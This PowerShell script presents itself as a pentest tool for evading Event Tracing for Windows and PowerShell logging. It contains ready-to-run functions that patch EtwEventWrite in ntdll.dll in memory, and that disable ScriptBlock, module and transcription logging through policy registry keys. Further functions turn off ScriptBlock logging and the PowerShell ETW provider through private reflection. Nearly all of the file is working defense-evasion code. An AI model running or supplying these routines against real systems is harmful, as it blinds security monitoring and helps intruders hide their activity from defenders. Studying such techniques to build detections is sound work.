<#
.SYNOPSIS
    ETW (Event Tracing for Windows) bypass techniques.
.DESCRIPTION
    Disable ETW tracing to prevent telemetry from being collected.
    Bypasses PowerShell ScriptBlock logging, module logging, and .NET ETW.
.NOTES
    MITRE ATT&CK: T1562.001 — Disable or Modify Tools
    Context: Authorized penetration testing — demonstrates monitoring gaps.
#>

function Bypass-ETWPatch {
    <# Patch EtwEventWrite in ntdll.dll to return immediately #>
    $code = @'
using System;
using System.Runtime.InteropServices;
public class ETWBypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr addr = GetProcAddress(ntdll, "EtwEventWrite");
        uint oldProtect = 0;
        VirtualProtect(addr, (UIntPtr)1, 0x40, out oldProtect);
        Marshal.WriteByte(addr, 0xC3); // ret
        VirtualProtect(addr, (UIntPtr)1, oldProtect, out oldProtect);
    }
}
'@
    Add-Type $code
    [ETWBypass]::Patch()
    Write-Output "[+] ETW bypass (EtwEventWrite patch) applied"
}

function Disable-ScriptBlockLogging {
    <# Disable PowerShell ScriptBlock logging via registry #>
    $path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
    Set-ItemProperty -Path $path -Name "EnableScriptBlockLogging" -Value 0 -Force
    Set-ItemProperty -Path $path -Name "EnableScriptBlockInvocationLogging" -Value 0 -Force
    Write-Output "[+] ScriptBlock logging disabled"
}

function Disable-ScriptBlockLoggingInMemory {
    <# Disable ScriptBlock logging in-memory (no registry changes) #>
    $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
    $field = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
    $settings = $field.GetValue($null)
    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'].Add('EnableScriptBlockLogging', '0')
    Write-Output "[+] ScriptBlock logging disabled (in-memory)"
}

function Disable-ModuleLogging {
    <# Disable PowerShell module logging #>
    $path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
    if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
    Set-ItemProperty -Path $path -Name "EnableModuleLogging" -Value 0 -Force
    Write-Output "[+] Module logging disabled"
}

function Disable-TranscriptionLogging {
    <# Disable PowerShell transcription #>
    $path = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
    if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
    Set-ItemProperty -Path $path -Name "EnableTranscripting" -Value 0 -Force
    Set-ItemProperty -Path $path -Name "EnableInvocationHeader" -Value 0 -Force
    Write-Output "[+] Transcription logging disabled"
}

function Bypass-DotNetETW {
    <# Patch .NET ETW provider to suppress CLR telemetry #>
    $assembly = [Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
    $etwType = $assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($etwType) {
        $etwField = $etwType.GetField('etwEnabled', 'NonPublic,Static')
        if ($etwField) {
            $etwField.SetValue($null, $false)
            Write-Output "[+] .NET ETW provider disabled"
        }
    } else {
        Write-Output "[-] Could not locate PSEtwLogProvider"
    }
}

function Check-LoggingStatus {
    Write-Output "[*] PowerShell Logging Status:"

    $sbPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    $sbEnabled = (Get-ItemProperty $sbPath -ErrorAction SilentlyContinue).EnableScriptBlockLogging
    Write-Output "    ScriptBlock Logging : $(if ($sbEnabled -eq 1) {'ENABLED'} else {'Disabled'})"

    $mlPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
    $mlEnabled = (Get-ItemProperty $mlPath -ErrorAction SilentlyContinue).EnableModuleLogging
    Write-Output "    Module Logging      : $(if ($mlEnabled -eq 1) {'ENABLED'} else {'Disabled'})"

    $trPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
    $trEnabled = (Get-ItemProperty $trPath -ErrorAction SilentlyContinue).EnableTranscripting
    Write-Output "    Transcription       : $(if ($trEnabled -eq 1) {'ENABLED'} else {'Disabled'})"
}

Write-Output @"
[*] ETW Bypass Functions Loaded:

    Bypass-ETWPatch                    # Patch EtwEventWrite (ntdll.dll)
    Disable-ScriptBlockLogging         # Registry-based SB logging disable
    Disable-ScriptBlockLoggingInMemory # In-memory SB logging disable
    Disable-ModuleLogging              # Module logging disable
    Disable-TranscriptionLogging       # Transcription disable
    Bypass-DotNetETW                   # .NET CLR ETW disable

    Check-LoggingStatus                # Show current logging settings
"@
